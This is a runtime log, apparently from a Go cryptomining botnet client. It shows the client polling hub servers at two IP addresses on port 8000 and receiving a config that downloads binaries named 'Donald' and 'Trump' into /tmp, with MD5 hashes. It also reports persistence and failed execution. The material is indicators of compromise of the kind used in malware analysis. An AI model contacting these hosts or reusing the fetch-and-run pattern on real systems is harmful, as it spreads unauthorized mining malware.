+I0615 12:48:11.940011   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:21.693290   17737 report.go:46] empty baselist
+I0615 12:48:21.737960   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:48:21.738283   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:21.740552   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:21.742747   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:21.744337   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:21.745927   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:21.747399   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:31.693322   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:48:31.693431   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:48:31.693472   17737 report.go:46] empty baselist
+I0615 12:48:31.926256   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:48:31.926332   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:31.928501   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:31.929962   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:31.931272   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:31.932819   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:31.934255   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:41.693268   17737 main.go:110] try hub: 103.219.112.66:8000
+I0615 12:48:41.693366   17737 main.go:113] skip 103.219.112.66:8000
+I0615 12:48:41.693466   17737 report.go:46] empty baselist
+I0615 12:48:41.734432   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:48:41.734837   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:41.738449   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:41.740482   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:41.742576   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:41.744956   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:41.747218   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:51.693314   17737 main.go:110] try hub: 103.219.112.66:8000
+I0615 12:48:51.693403   17737 main.go:113] skip 103.219.112.66:8000
+I0615 12:48:51.693501   17737 report.go:46] empty baselist
+I0615 12:48:51.730702   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:48:51.731391   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:51.733815   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:51.735863   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:51.737844   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:51.739633   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:48:51.741885   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:01.693272   17737 main.go:110] try hub: 103.219.112.66:8000
+I0615 12:49:01.693371   17737 main.go:113] skip 103.219.112.66:8000
+I0615 12:49:01.693467   17737 report.go:46] empty baselist
+I0615 12:49:01.739300   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:49:01.750159   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:01.752775   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:01.755826   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:01.757826   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:01.759737   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:01.761778   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:11.693423   17737 report.go:46] empty baselist
+I0615 12:49:11.723737   17737 utils.go:135] Persistence 1366 Node Successfully
+I0615 12:49:11.729031   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:49:11.734334   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:11.736379   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:11.740654   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:11.742557   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:11.744739   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:11.747516   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:21.693169   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:49:21.693263   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:49:21.693328   17737 report.go:46] empty baselist
+I0615 12:49:21.928724   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:49:21.928808   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:21.931255   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:21.932676   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:21.934600   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:21.936960   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:21.939453   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:31.693248   17737 main.go:110] try hub: 103.219.112.66:8000
+I0615 12:49:31.693335   17737 main.go:113] skip 103.219.112.66:8000
+I0615 12:49:31.693429   17737 report.go:46] empty baselist
+I0615 12:49:31.731396   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:49:31.733826   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:31.738659   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:31.741944   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:31.744480   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:31.746296   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:31.748493   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:41.693195   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:49:41.693843   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:49:41.694046   17737 report.go:46] empty baselist
+I0615 12:49:42.138769   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:49:42.138868   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:42.141316   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:42.143343   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:42.145470   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:42.147445   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:42.149633   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:51.693341   17737 report.go:46] empty baselist
+I0615 12:49:52.274774   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:49:52.275637   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:52.279113   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:52.281800   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:52.283729   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:52.286611   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:49:52.288822   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:01.693184   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:50:01.693305   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:50:01.693346   17737 report.go:46] empty baselist
+I0615 12:50:01.956851   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:50:01.958215   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:01.964566   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:01.967961   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:01.973290   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:01.975517   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:01.977364   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:11.697067   17737 report.go:46] empty baselist
+I0615 12:50:11.738926   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:50:11.742574   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:11.750287   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:11.762914   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:11.780045   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:11.792168   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:11.799125   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:11.859677   17737 miner.go:93] pid not exists {{/tmp/Donald /static/Donald 0f8c0d79ad9f258f8aa56c38968a18f0}}
+I0615 12:50:11.868788   17737 miner.go:93] pid not exists {{/tmp/Trump /static/Trump ed3ddd57d2486b11e52a8ae4c8be8ace}}
+I0615 12:50:11.942842   17737 miner.go:101] fork/exec /tmp/Donald: exec format error: {XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}}
+I0615 12:50:11.982605   17737 miner.go:101] fork/exec /tmp/Trump: exec format error: {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}
+I0615 12:50:21.693044   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:50:21.693972   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:50:21.694293   17737 report.go:46] empty baselist
+I0615 12:50:21.922907   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:50:21.924005   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:21.927796   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:21.930286   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:21.932983   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:21.935542   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:21.937608   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:31.693371   17737 report.go:46] empty baselist
+I0615 12:50:31.733391   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:50:31.733781   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:31.736856   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:31.738991   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:31.741191   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:31.743078   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:31.745808   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:41.693310   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:50:41.693404   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:50:41.693444   17737 report.go:46] empty baselist
+I0615 12:50:41.918355   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:50:41.919146   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:41.923398   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:41.925958   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:41.928456   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:41.931142   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:41.933561   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:51.694148   17737 report.go:46] empty baselist
+I0615 12:50:51.777054   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:50:51.777145   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:51.780604   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:51.782258   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:51.784107   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:51.785802   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:50:51.788040   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:01.693302   17737 main.go:110] try hub: 103.219.112.66:8000
+I0615 12:51:01.693405   17737 main.go:113] skip 103.219.112.66:8000
+I0615 12:51:01.693507   17737 report.go:46] empty baselist
+I0615 12:51:01.740215   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:51:01.740831   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:01.743771   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:01.746503   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:01.748365   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:01.750754   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:01.752504   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:11.693433   17737 main.go:110] try hub: 103.219.112.66:8000
+I0615 12:51:11.694160   17737 main.go:113] skip 103.219.112.66:8000
+I0615 12:51:11.694385   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:51:11.694754   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:51:11.694905   17737 report.go:46] empty baselist
+I0615 12:51:11.919367   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:51:11.919464   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:11.923017   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:11.925043   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:11.927553   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:11.930244   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:11.935980   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:21.693204   17737 main.go:110] try hub: 103.219.112.66:8000
+I0615 12:51:21.693306   17737 main.go:113] skip 103.219.112.66:8000
+I0615 12:51:21.693339   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:51:21.693369   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:51:21.693405   17737 report.go:46] empty baselist
+I0615 12:51:21.920160   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:51:21.921113   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:21.925012   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:21.927694   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:21.930169   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:21.932879   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:21.935313   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:31.693401   17737 report.go:46] empty baselist
+I0615 12:51:31.732060   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:51:31.732755   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:31.735527   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:31.738029   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:31.740494   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:31.743241   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:31.745469   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:41.693133   17737 main.go:110] try hub: 103.219.112.66:8000
+I0615 12:51:41.693531   17737 main.go:113] skip 103.219.112.66:8000
+I0615 12:51:41.694098   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:51:41.694363   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:51:41.694796   17737 report.go:46] empty baselist
+I0615 12:51:41.922431   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:51:41.923030   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:41.926247   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:41.928439   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:41.930810   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:41.933088   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:41.935123   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:51.696943   17737 main.go:110] try hub: 103.219.112.66:8000
+I0615 12:51:51.697017   17737 main.go:113] skip 103.219.112.66:8000
+I0615 12:51:51.697113   17737 report.go:46] empty baselist
+I0615 12:51:51.737045   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:51:51.737137   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:51.739262   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:51.741299   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:51.742887   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:51.744469   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:51:51.746081   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:01.694303   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:52:01.694403   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:52:01.694444   17737 report.go:46] empty baselist
+I0615 12:52:01.920318   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:52:01.920396   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:01.922636   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:01.924073   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:01.925758   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:01.927072   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:01.928650   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:11.693326   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:52:11.693394   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:52:11.693422   17737 report.go:46] empty baselist
+I0615 12:52:11.920009   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:52:11.920990   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:11.924440   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:11.927084   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:11.929720   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:11.936663   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:11.938605   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:21.694891   17737 report.go:46] empty baselist
+I0615 12:52:21.743391   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:52:21.743987   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:21.755897   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:21.759842   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:21.762106   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:21.764108   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:21.766234   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:31.698132   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:52:31.698208   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:52:31.698233   17737 report.go:46] empty baselist
+I0615 12:52:31.922379   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:52:31.923132   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:52:31.925981   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
